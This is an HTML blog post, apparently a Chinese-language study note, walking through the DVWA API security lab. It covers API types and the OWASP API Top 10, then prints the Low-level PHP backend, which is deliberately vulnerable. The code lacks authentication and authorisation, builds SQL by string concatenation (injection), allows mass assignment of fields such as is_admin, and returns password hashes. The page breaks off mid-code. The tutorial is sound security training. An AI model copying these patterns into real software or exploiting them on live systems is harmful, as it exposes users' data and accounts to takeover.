@@ -1,0 +1,925 @@
+<!DOCTYPE html>
+<html lang="en,zh-CN,default">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.1.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/fancybox/2.1.5/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/undefined/pace/pace-theme-pace-theme-center-atom.min.css">
+  <script src="/undefined/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"caixuya.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"hide","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":false,"nav":null},"algolia":{"appID":"B5HBQCBE1B","apiKey":"ea181e93e7b10c0d94c8e758b7eb25ab","indexName":"hexo","hits":{"per_page":10},"labels":{"input_placeholder":"输入关键字","hits_empty":"没有找到与「${query}」相关的内容","hits_stats":"${hits}条相关记录，共耗时 ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="目录 漏洞简介 Low 难度 Medium 难度 High 难度 Impossible 难度 防御建议   漏洞简介什么是API安全漏洞？API（Application Programming Interface）安全漏洞是指RESTful API、GraphQL API、SOAP API等接口中存在的安全问题，可能导致数据泄露、未授权访问或系统被攻击。 API的类型： 1. REST API使用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DVWA - API (应用程序接口) 攻防练习详解">
+<meta property="og:url" content="http://caixuya.github.io/2025/11/20/API_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/index.html">
+<meta property="og:site_name" content="tia的学习笔记">
+<meta property="og:description" content="目录 漏洞简介 Low 难度 Medium 难度 High 难度 Impossible 难度 防御建议   漏洞简介什么是API安全漏洞？API（Application Programming Interface）安全漏洞是指RESTful API、GraphQL API、SOAP API等接口中存在的安全问题，可能导致数据泄露、未授权访问或系统被攻击。 API的类型： 1. REST API使用">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-11-20T15:31:37.143Z">
+<meta property="article:modified_time" content="2025-11-20T15:22:49.442Z">
+<meta property="article:author" content="caixuya">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://caixuya.github.io/2025/11/20/API_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>DVWA - API (应用程序接口) 攻防练习详解 | tia的学习笔记</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="tia的学习笔记" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">tia的学习笔记</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-主页">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>主页</a>
+
+  </li>
+        <li class="menu-item menu-item-分类">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-目录">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>目录</a>
+
+  </li>
+        <li class="menu-item menu-item-站点地图">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-关于我">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于我</a>
+
+  </li>
+        <li class="menu-item menu-item-开往">
+
+    <a href="/travelling/" rel="section"><i class="fa fa-paper-plane fa-fw"></i>开往</a>
+
+  </li>
+        <li class="menu-item menu-item-给我写信">
+
+    <a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=vY_MiY2FhI2Ojf3MzJPe0tA" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>给我写信</a>
+
+  </li>
+        <li class="menu-item menu-item-公益404">
+
+    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益404</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container"></div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="algolia-results">
+  <div id="algolia-stats"></div>
+  <div id="algolia-hits"></div>
+  <div id="algolia-pagination" class="algolia-pagination"></div>
+</div>
+
+      
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://caixuya.github.io/2025/11/20/API_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="caixuya">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="tia的学习笔记">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          DVWA - API (应用程序接口) 攻防练习详解
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2025-11-20 23:31:37 / Modified: 23:22:49" itemprop="dateCreated datePublished" datetime="2025-11-20T23:31:37+08:00">2025-11-20</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/dvwa%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">dvwa靶场学习笔记</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>28k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>25 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B">漏洞简介</a></li>
+<li><a href="#low-%E9%9A%BE%E5%BA%A6">Low 难度</a></li>
+<li><a href="#medium-%E9%9A%BE%E5%BA%A6">Medium 难度</a></li>
+<li><a href="#high-%E9%9A%BE%E5%BA%A6">High 难度</a></li>
+<li><a href="#impossible-%E9%9A%BE%E5%BA%A6">Impossible 难度</a></li>
+<li><a href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE">防御建议</a></li>
+</ul>
+<hr>
+<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h3 id="什么是API安全漏洞？"><a href="#什么是API安全漏洞？" class="headerlink" title="什么是API安全漏洞？"></a>什么是API安全漏洞？</h3><p>API（Application Programming Interface）安全漏洞是指RESTful API、GraphQL API、SOAP API等接口中存在的安全问题，可能导致数据泄露、未授权访问或系统被攻击。</p>
+<p><strong>API的类型：</strong></p>
+<h3 id="1-REST-API"><a href="#1-REST-API" class="headerlink" title="1. REST API"></a>1. REST API</h3><p>使用HTTP方法操作资源：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET    <span class="regexp">/api/u</span>sers/<span class="number">123</span>      <span class="comment"># 获取用户</span></span><br><span class="line">POST   <span class="regexp">/api/u</span>sers          <span class="comment"># 创建用户</span></span><br><span class="line">PUT    <span class="regexp">/api/u</span>sers/<span class="number">123</span>      <span class="comment"># 更新用户</span></span><br><span class="line">DELETE <span class="regexp">/api/u</span>sers/<span class="number">123</span>      <span class="comment"># 删除用户</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-GraphQL-API"><a href="#2-GraphQL-API" class="headerlink" title="2. GraphQL API"></a>2. GraphQL API</h3><p>使用查询语言获取数据：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">query &#123;</span><br><span class="line">  user(id: 123) &#123;</span><br><span class="line">    name</span><br><span class="line">    email</span><br><span class="line">    posts &#123;</span><br><span class="line">      title</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-SOAP-API"><a href="#3-SOAP-API" class="headerlink" title="3. SOAP API"></a>3. SOAP API</h3><p>基于XML的协议：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soap:Envelope</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">GetUser</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">UserId</span>&gt;</span>123<span class="tag">&lt;/<span class="name">UserId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">GetUser</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>OWASP API Security Top 10 (2023)：</strong></p>
+<table>
+<thead>
+<tr>
+<th>排名</th>
+<th>漏洞</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>API1</td>
+<td>对象级别授权失效</td>
+<td>访问他人数据</td>
+</tr>
+<tr>
+<td>API2</td>
+<td>认证机制失效</td>
+<td>弱认证</td>
+</tr>
+<tr>
+<td>API3</td>
+<td>对象属性级别授权失效</td>
+<td>修改敏感字段</td>
+</tr>
+<tr>
+<td>API4</td>
+<td>资源消耗无限制</td>
+<td>DoS攻击</td>
+</tr>
+<tr>
+<td>API5</td>
+<td>功能级别授权失效</td>
+<td>越权操作</td>
+</tr>
+<tr>
+<td>API6</td>
+<td>批量赋值</td>
+<td>修改额外字段</td>
+</tr>
+<tr>
+<td>API7</td>
+<td>配置错误</td>
+<td>暴露敏感信息</td>
+</tr>
+<tr>
+<td>API8</td>
+<td>注入攻击</td>
+<td>SQL&#x2F;NoSQL注入</td>
+</tr>
+<tr>
+<td>API9</td>
+<td>资产管理不当</td>
+<td>旧版本API</td>
+</tr>
+<tr>
+<td>API10</td>
+<td>API日志和监控不足</td>
+<td>无法检测攻击</td>
+</tr>
+</tbody></table>
+<p><strong>危害：</strong></p>
+<ul>
+<li>数据泄露</li>
+<li>未授权访问</li>
+<li>账户接管</li>
+<li>DoS攻击</li>
+<li>业务逻辑绕过</li>
+</ul>
+<p><strong>DVWA场景：</strong><br>一个用户管理的REST API，提供CRUD操作。</p>
+<hr>
+<h2 id="Low-难度"><a href="#Low-难度" class="headerlink" title="Low 难度"></a>Low 难度</h2><h3 id="攻击目标"><a href="#攻击目标" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>完全不验证权限，任何人都可以访问和修改任何数据。</p>
+<h3 id="后端代码分析"><a href="#后端代码分析" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ Low难度：完全没有认证和授权 ★★★</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置JSON响应头</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application/json&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取HTTP方法</span></span><br><span class="line"><span class="variable">$method</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取请求路径</span></span><br><span class="line"><span class="variable">$path</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 危险操作1：不检查认证 ★★★</span></span><br><span class="line"><span class="comment">// 任何人都可以访问API</span></span><br><span class="line"><span class="comment">// 没有API密钥、Token或其他认证机制</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 危险操作2：不检查授权 ★★★</span></span><br><span class="line"><span class="comment">// 没有验证用户是否有权限操作数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 路由：GET /api/users - 获取所有用户</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$method</span> == <span class="string">&#x27;GET&#x27;</span> &amp;&amp; <span class="variable">$path</span> == <span class="string">&#x27;/users&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 问题：返回所有用户信息，包括敏感数据 ★★★</span></span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM users&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$users</span> = [];</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>)) &#123;</span><br><span class="line">        <span class="comment">// ★★★ 问题：返回密码哈希 ★★★</span></span><br><span class="line">        <span class="variable">$users</span>[] = <span class="variable">$row</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">        <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">        <span class="string">&#x27;data&#x27;</span> =&gt; <span class="variable">$users</span></span><br><span class="line">    ]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 路由：GET /api/users/&#123;id&#125; - 获取单个用户</span></span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="variable">$method</span> == <span class="string">&#x27;GET&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/users\/(\d+)$/&#x27;</span>, <span class="variable">$path</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$userId</span> = <span class="variable">$matches</span>[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 问题：不检查是否有权查看该用户 ★★★</span></span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM users WHERE user_id = &#x27;<span class="subst">$userId</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span> =&gt; <span class="variable">$row</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;User not found&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 路由：POST /api/users - 创建用户</span></span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="variable">$method</span> == <span class="string">&#x27;POST&#x27;</span> &amp;&amp; <span class="variable">$path</span> == <span class="string">&#x27;/users&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 问题：任何人都可以创建用户 ★★★</span></span><br><span class="line">    <span class="comment">// 没有限流，可以创建大量垃圾账户</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$input</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$input</span>[<span class="string">&#x27;username&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$input</span>[<span class="string">&#x27;password&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$email</span> = <span class="variable">$input</span>[<span class="string">&#x27;email&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 问题：直接拼接SQL，存在SQL注入 ★★★</span></span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;INSERT INTO users (user, password, email) VALUES (&#x27;<span class="subst">$username</span>&#x27;, &#x27;&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>) . <span class="string">&quot;&#x27;, &#x27;<span class="subst">$email</span>&#x27;)&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;User created&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;user_id&#x27;</span> =&gt; <span class="title function_ invoke__">mysqli_insert_id</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])</span><br><span class="line">        ]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Failed to create user&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 路由：PUT /api/users/&#123;id&#125; - 更新用户</span></span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="variable">$method</span> == <span class="string">&#x27;PUT&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/users\/(\d+)$/&#x27;</span>, <span class="variable">$path</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$userId</span> = <span class="variable">$matches</span>[<span class="number">1</span>];</span><br><span class="line">    <span class="variable">$input</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 问题：任何人都可以修改任何用户 ★★★</span></span><br><span class="line">    <span class="comment">// 没有验证是否是用户本人或管理员</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 问题：批量赋值漏洞 ★★★</span></span><br><span class="line">    <span class="comment">// 可以修改任意字段，包括role、is_admin等</span></span><br><span class="line">    <span class="variable">$fields</span> = [];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="comment">// ★★★ 问题：直接拼接，SQL注入 ★★★</span></span><br><span class="line">        <span class="variable">$fields</span>[] = <span class="string">&quot;<span class="subst">$key</span> = &#x27;<span class="subst">$value</span>&#x27;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;UPDATE users SET &quot;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;, &#x27;</span>, <span class="variable">$fields</span>) . <span class="string">&quot; WHERE user_id = &#x27;<span class="subst">$userId</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;User updated&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Failed to update user&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 路由：DELETE /api/users/&#123;id&#125; - 删除用户</span></span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="variable">$method</span> == <span class="string">&#x27;DELETE&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/users\/(\d+)$/&#x27;</span>, <span class="variable">$path</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$userId</span> = <span class="variable">$matches</span>[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 问题：任何人都可以删除任何用户 ★★★</span></span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;DELETE FROM users WHERE user_id = &#x27;<span class="subst">$userId</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span 